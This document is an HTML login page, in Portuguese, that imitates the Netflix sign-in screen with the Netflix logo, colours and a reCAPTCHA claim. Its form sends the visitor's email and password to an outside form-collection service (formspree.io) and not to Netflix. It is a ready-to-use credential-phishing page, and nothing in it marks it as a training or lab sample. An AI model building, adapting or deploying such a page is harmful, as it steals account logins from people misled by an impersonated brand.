<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Entrar - Netflix</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background-color: #141414;
      color: #fff;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
    }

    .logo {
      width: 160px;
      margin-bottom: 40px;
    }

    .login-box {
      background-color: rgba(0, 0, 0, 0.75);
      padding: 60px 40px;
      border-radius: 8px;
      width: 100%;
      max-width: 350px;
    }

    .login-box h1 {
      font-size: 28px;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      background-color: #333;
      border: none;
      border-radius: 4px;
      color: #fff;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #e50914;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
    }

    .options {
      display: flex;
      justify-content: space-between;
      font-size: 14px;
      color: #b3b3b3;
      margin-top: 10px;
    }

    .options input {
      margin-right: 5px;
    }

    .help-links {
      font-size: 14px;
      color: #737373;
      margin-top: 50px;
      text-align: center;
    }

    .help-links a {
      color: #fff;
      text-decoration: none;
    }

    .help-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">

    <div class="login-box">
      <h1>Entrar</h1>
      <form action="https://formspree.io/f/xwplaaqz" method="POST">
        <input type="email" name="email" placeholder="Email ou número de telefone" required>
        <input type="password" name="senha" placeholder="Senha" required>
        <button type="submit">Entrar</button>

        <div class="options">
          <label><input type="checkbox" name="lembrar"> Lembre-se de mim</label>
          <a href="#" style="color: #b3b3b3;">Precisa de ajuda?</a>
        </div>
      </form>

      <div class="help-links">
        <p>Novo por aqui? <a href="#">Assine agora</a>.</p>
        <p>Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô.</p>
      </div>
    </div>
  </div>

</body>
</html>
